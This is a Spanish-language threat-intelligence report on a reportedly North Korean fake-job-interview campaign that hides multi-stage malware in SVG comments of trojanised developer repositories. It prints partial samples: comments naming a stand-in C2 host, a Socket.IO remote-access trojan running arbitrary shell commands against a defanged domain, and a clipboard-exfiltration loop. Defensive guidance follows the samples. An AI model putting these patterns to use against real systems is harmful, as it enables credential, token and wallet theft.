## Resumen ejecutivo

Una campaña de **actores alineados con Corea del Norte (DPRK)** llamada **Contagious Interview (REF9403)** utiliza **steganografía en archivos SVG** para ocultar malware de 4 etapas dirigido específicamente a **desarrolladores de software**.

**El punto crítico:** al momento de la divulgación, **ningún motor antivirus**
detectaba los repositorios troyanizados. No es una firma que faltaba: es un hueco
estructural en cómo los antivirus analizan el contenido semántico de un SVG.

**Métricas clave:**

- Severidad: CRITICAL
- Objetivo: personas que desarrollan software
- Método: esteganografía en archivos SVG
- Detección antivirus al momento de la divulgación: ninguna
- Carga útil: cuatro etapas, alineada con OTTERCOOKIE
- Divulgación: 18 de julio de 2026

---

## Contexto: por qué este caso importa

**Rompe una intuición muy extendida.** Un SVG se percibe como una imagen, y
una imagen se percibe como datos inertes. Es un archivo de texto que admite
comentarios arbitrarios, y ahí cabe cualquier cosa.

**El objetivo es quien construye, no quien consume.** Una máquina de
desarrollo concentra credenciales de infraestructura, acceso a repositorios y
claves de firma. Comprometerla rinde más que comprometer a un usuario final.

**Muestra el límite de los controles centralizados.** Nada de lo que
despliega una organización en su perímetro alcanza a un repositorio que alguien
clona y ejecuta en su propia máquina.

## 1. El ataque: oferta de trabajo falsa

El ataque comienza de manera simple pero efectiva:

### El vector: ingeniería social

Los actores se hacen pasar por reclutadores técnicos y publican avisos en redes
profesionales:

```
[SEÑUELO] OFERTA DE TRABAJO FALSA:
═══════════════════════════════════════════
Empresa: "TechCorp Innovations"
Posición: Senior Full-Stack Developer
Ubicación: Remote
Salario: $120k-140k

"Interesado? Completa nuestro coding challenge:
https://github.com/techcorp-innovations/developer-challenge"

(Link apunta a repo trojanzado)
═══════════════════════════════════════════
```

### Por qué funciona

1. **La curiosidad profesional juega en contra.** Un desafío de programación es una
   forma normal de medir el propio nivel, así que ejecutarlo no se siente como un riesgo.
2. **GitHub carga con una confianza que no le corresponde.** Alojar código ahí no
   dice nada sobre quién lo escribió, pero baja la guardia de quien lo clona.
3. **El repositorio tiene código real y funciona.** Nada en la experiencia de uso
   sugiere que haya algo más adentro.
4. **Una imagen no parece un ejecutable.** Y los antivirus tampoco la tratan como
   tal: no analizan el contenido semántico de un SVG.

---

## 2. El contenedor: esteganografía en SVG

### ¿Cómo Funciona?

Los actores ocultan **malware JavaScript fragmentado** en **archivos SVG de banderas de países**.

```xml
<!-- Archivo: src/assets/flags/us-flag.svg (aparentemente inocuo) -->
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <!-- US Flag stripes -->
  <rect x="0" y="0" width="100" height="100" fill="#B22234" />
  <rect x="0" y="8" width="100" height="8" fill="white" />
  
  <!-- AQUI ESTA EL MALWARE -->
  <!-- Stage 1: var _0x4f2c=['https://c2.example.com','exfil_data']; -->
  <!-- Stage 2: function steal_credentials() { ... } -->
  <!-- Stage 3: fetch('/api/service/makelog', {method:'POST'...}) -->
  <!-- Stage 4: setInterval(() => exfiltrate(), 60000) -->
</svg>
```

### Por qué esto evade al antivirus

**Los antivirus están diseñados para:**
- <Pass />Detectar código malicioso en ejecutables
- <Pass />Detectar guiones en archivos `.js` o `.ps1`
- <Pass />Detectar manipulación de una imagen a nivel de píxel

**Los antivirus NO están diseñados para:**
- <Fail />Leer los comentarios que hay dentro de un SVG
- <Fail />Entender que lo que está comentado sigue siendo código
- <Fail />Analizar el contenido semántico de un XML

**Resultado:** ocultamiento perfecto. Cero detecciones.

## 3. El payload: OTTERCOOKIE en 4 etapas

Cuando quien desarrolla ejecuta el proyecto (`npm install` → `npm run build`):

### Etapa 1: robo de credenciales del navegador

```javascript
// Extracted from malware analysis
function steal_browser_credentials() {
  // Accede a:
  // - Chrome/Firefox stored passwords
  // - Saved credit cards
  // - OAuth tokens
  // - Session cookies
  
  exfiltrate_to_c2(credentials);
}
```

**Lo que busca:**
- Tokens de GitHub
- Credenciales de AWS
- Extensiones de billeteras de criptomonedas

### Etapa 2: robo de billeteras de criptomonedas

Apunta específicamente a equipos de desarrollo, que suelen tener:
- Fondos acumulados a lo largo del tiempo
- Claves privadas guardadas en el disco
- Frases de recuperación abiertas en memoria

### Etapa 3: troyano de acceso remoto sobre Socket.IO

```javascript
const io = require('socket.io-client');
const socket = io('hxxps://rightwidth[.]dev:443');

socket.on('execute_command', (cmd) => {
  // Execute arbitrary shell commands
  exec(cmd, (err, stdout) => {
    socket.emit('command_result', stdout);
  });
});
```

**Le permite al atacante:**
- Ejecutar comandos arbitrarios en el equipo
- Instalar puertas traseras adicionales
- Moverse lateralmente hacia el resto de la red
- Operar con las criptomonedas de la víctima en una casa de cambio

### Etapa 4: vigilancia del portapapeles

```javascript
// Monitorea el clipboard constantemente
setInterval(() => {
  const clipboard_content = get_clipboard();
  
  if (clipboard_content.includes('0x') || // Crypto address
      clipboard_content.includes('http') || // URLs
      clipboard_content.match(/key|secret|password/i)) { // Credentials
    
    exfiltrate_to_c2(clipboard_content);
  }
}, 5000); // Every 5 seconds
```

**Para qué:** capturar credenciales, direcciones de billeteras y tokens en el
momento en que la persona los copia y pega — que es justo cuando están en claro.

## Lecciones aprendidas

### Para quien desarrolla

1. **No ejecutar código de origen desconocido**
   - Que el repositorio esté en GitHub no lo vuelve confiable: hay que revisarlo antes de clonarlo
   - Leer el código antes de correr `npm install`

2. **La esteganografía en imágenes es un vector poco vigilado**
   - Un archivo `.svg` o `.png` no es inofensivo por su extensión
   - Vigilar los procesos que abren archivos multimedia y hacen algo más que mostrarlos

3. **Tener billeteras de criptomonedas en el equipo de trabajo es un riesgo**
   - Billetera por hardware para los fondos que importan
   - Equipos separados para desarrollo y para cripto

4. **La revisión de código es crítica en la cadena de suministro**
   - Sobre todo para las dependencias que se descargan
   - El análisis de seguridad en el pipeline de integración continua no es opcional

### Para quien analiza en un SOC

1. **Ampliar la detección más allá de los tipos de archivo habituales**
   - Escribir reglas YARA para el contenido de los comentarios en SVG
   - Vigilar patrones de decodificación Base64
   - Buscar importaciones de Socket.IO, que en este contexto delatan un troyano de acceso remoto

2. **Atacar a desarrolladores exige defensas propias**
   - Vigilar los accesos a las credenciales guardadas en el navegador
   - Alertar sobre la actividad de extensiones de billeteras de criptomonedas
   - Seguir los `npm install` que vengan de orígenes inusuales

3. **Cero detecciones del antivirus no es cero amenaza**
   - El monitoreo de integridad de archivos pasa a ser crítico
   - El análisis de comportamiento importa más que la firma
   - Un EDR aporta acá lo que el antivirus tradicional no puede ver

### Recomendaciones

**Implementar:**
1. Verificación de la cadena de suministro de software: firma de código e integridad de paquetes
2. Formación en seguridad para el equipo de desarrollo, con foco en ingeniería social
3. Análisis de repositorios en busca de cargas útiles incrustadas en archivos SVG y multimedia
4. Análisis de comportamiento sobre los procesos que se ejecutan al iniciar el equipo
5. Búsqueda proactiva de bloques de comentarios SVG que contengan código
6. Billetera por hardware obligatoria para los fondos en criptomonedas
7. Auditoría de extensiones del navegador y lista de permitidas
8. Plan de respuesta a incidentes para equipos de desarrollo comprometidos

**Monitorear:**
1. Acceso a archivos SVG e imágenes por parte de procesos de JavaScript
2. Importaciones de la biblioteca Socket.IO desde orígenes inusuales
3. Patrones de código ofuscado en las dependencias del proyecto
4. Accesos al portapapeles
5. Infraestructura de mando y control asociada a campañas de RPDC

## Conclusión

Cuatro cosas que este caso deja claras:

1. **La esteganografía dejó de ser una curiosidad académica** y pasó a ser un vector
   de entrega en campañas activas.
2. **Quien desarrolla es un objetivo de alto valor**, no un daño colateral: tiene
   credenciales de infraestructura, acceso a repositorios y, con frecuencia, fondos propios.
3. **Los antivirus tienen un hueco estructural**, no un fallo puntual: no analizan el
   contenido semántico de los formatos que consideran inofensivos.
4. **La seguridad de la cadena de suministro es responsabilidad compartida.** Ninguna
   herramienta de la organización cubre lo que alguien ejecuta en su propia máquina.
5. **Un formato se vuelve peligroso cuando nadie lo mira.** El SVG no tiene nada
   de inseguro en sí: lo que falta es que alguien lo trate como código.
